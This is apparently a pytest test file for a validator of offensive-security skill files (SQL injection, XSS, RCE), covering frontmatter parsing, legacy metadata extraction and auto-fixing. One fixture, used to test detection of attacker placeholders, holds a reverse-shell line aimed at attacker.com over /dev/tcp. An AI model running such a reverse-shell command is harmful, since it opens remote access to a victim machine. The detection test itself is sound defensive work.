import pytest
from pathlib import Path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))
from app.services.skill_validator import SkillValidator
from app.models.skill import SkillValidationStatus, SkillCategory


class TestSkillValidator:
    @pytest.fixture
    def validator(self, tmp_path):
        skills_dir = tmp_path / "Skills"
        skills_dir.mkdir()
        return SkillValidator(str(skills_dir))

    def _write_skill(self, skills_dir: str, category: str, name: str, content: str):
        cat_dir = Path(skills_dir) / category
        cat_dir.mkdir(parents=True, exist_ok=True)
        skill_dir = cat_dir / f"offensive-{name}"
        skill_dir.mkdir(parents=True, exist_ok=True)
        (skill_dir / "SKILL.md").write_text(content, encoding="utf-8")

    def test_valid_frontmatter(self, validator, tmp_path):
        content = """---
name: offensive-sqli
description: SQL injection testing skill for offensive security assessments covering detection, exploitation, and bypass techniques.
---
# SQL Injection Skill
## Description
Comprehensive SQL injection testing methodology.
"""
        self._write_skill(validator.skills_root, "web", "sqli", content)
        result = validator.validate_all()

        assert result.total_files == 1
        assert result.valid == 1
        assert result.missing_frontmatter == 0
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.VALID
        assert skill.frontmatter is not None
        assert skill.frontmatter.name == "offensive-sqli"
        assert "SQL injection" in skill.frontmatter.description

    def test_missing_frontmatter(self, validator, tmp_path):
        content = """# SKILL: Cross-Site Scripting (XSS)

## Metadata
- **Skill Name**: xss
- **Folder**: offensive-xss

## Description
Cross-Site Scripting testing checklist: stored/reflected/DOM/blind XSS discovery.
"""
        self._write_skill(validator.skills_root, "web", "xss", content)
        result = validator.validate_all()

        assert result.total_files == 1
        # Legacy extraction succeeds, so skill is VALID (with warning)
        assert result.valid == 1
        assert result.missing_frontmatter == 0
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.VALID
        assert skill.frontmatter is not None
        assert skill.frontmatter.name == "xss"
        assert "Extracted from legacy" in skill.validation_errors[-1]

    def test_missing_name_in_frontmatter(self, validator, tmp_path):
        content = """---
description: A skill with no name field.
---
"""
        self._write_skill(validator.skills_root, "web", "noname", content)
        result = validator.validate_all()

        assert result.missing_name == 1
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.MISSING_NAME

    def test_missing_description_in_frontmatter(self, validator, tmp_path):
        content = """---
name: offensive-test
---
"""
        self._write_skill(validator.skills_root, "web", "nodesc", content)
        result = validator.validate_all()

        assert result.missing_description == 1
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.MISSING_DESCRIPTION

    def test_description_too_long(self, validator, tmp_path):
        long_desc = "x" * 1500
        content = f"""---
name: offensive-long
description: {long_desc}
---
"""
        self._write_skill(validator.skills_root, "web", "long", content)
        result = validator.validate_all()

        assert result.description_too_long == 1
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.DESCRIPTION_TOO_LONG

    def test_invalid_yaml(self, validator, tmp_path):
        content = """---
name: offensive-bad
description: "unclosed quote
---
"""
        self._write_skill(validator.skills_root, "web", "badyaml", content)
        result = validator.validate_all()

        assert result.invalid_yaml == 1
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.INVALID_YAML

    def test_attacker_com_detection(self, validator, tmp_path):
        content = """---
name: offensive-rce
description: RCE testing with callback to attacker.com
---
## Description
Reverse shell: /dev/tcp/attacker.com/443
"""
        self._write_skill(validator.skills_root, "web", "rce", content)
        result = validator.validate_all()

        assert result.attacker_placeholder == 1
        skill = result.skills[0]
        assert skill.has_attacker_com is True
        assert len(skill.attacker_com_locations) >= 1

    def test_legacy_metadata_extraction(self, validator, tmp_path):
        content = """# SKILL: SQL Injection

## Metadata
- **Skill Name**: sqli
- **Folder**: offensive-sqli
- **Source**: https://example.com

## Description
SQL injection testing methodology covering union, blind, time-based techniques.
"""
        self._write_skill(validator.skills_root, "web", "sqli-legacy", content)
        result = validator.validate_all()

        # Legacy extraction succeeds, so skill is VALID (with warning)
        assert result.valid == 1
        assert result.missing_frontmatter == 0
        skill = result.skills[0]
        assert skill.validation_status == SkillValidationStatus.VALID
        assert skill.frontmatter is not None
        assert skill.frontmatter.name == "sqli"
        assert "SQL injection testing methodology" in skill.frontmatter.description
        assert "Extracted from legacy" in skill.validation_errors[-1]
    def test_generate_frontmatter(self, validator, tmp_path):
        content = """# SKILL: XSS

## Metadata
- **Skill Name**: xss
- **Folder**: offensive-xss

## Description
Cross-Site Scripting testing checklist.
"""
        self._write_skill(validator.skills_root, "web", "xss", content)
        result = validator.validate_all()
        skill = result.skills[0]

        frontmatter = validator.generate_frontmatter(skill)
        assert frontmatter.startswith("---\n")
        assert "name: xss" in frontmatter
        assert "description: Cross-Site Scripting testing checklist." in frontmatter
        assert frontmatter.endswith("---\n\n")

    def test_fix_skill_file(self, validator, tmp_path):
        content = """# SKILL: XSS

## Metadata
- **Skill Name**: xss
- **Folder**: offensive-xss

## Description
Cross-Site Scripting testing checklist.
"""
        self._write_skill(validator.skills_root, "web", "xss", content)
        result = validator.validate_all()
        skill = result.skills[0]

        original, fixed = validator.fix_skill_file(skill)
        assert "name: xss" in fixed
        assert "description: Cross-Site Scripting testing checklist." in fixed
        assert fixed.startswith("---\n")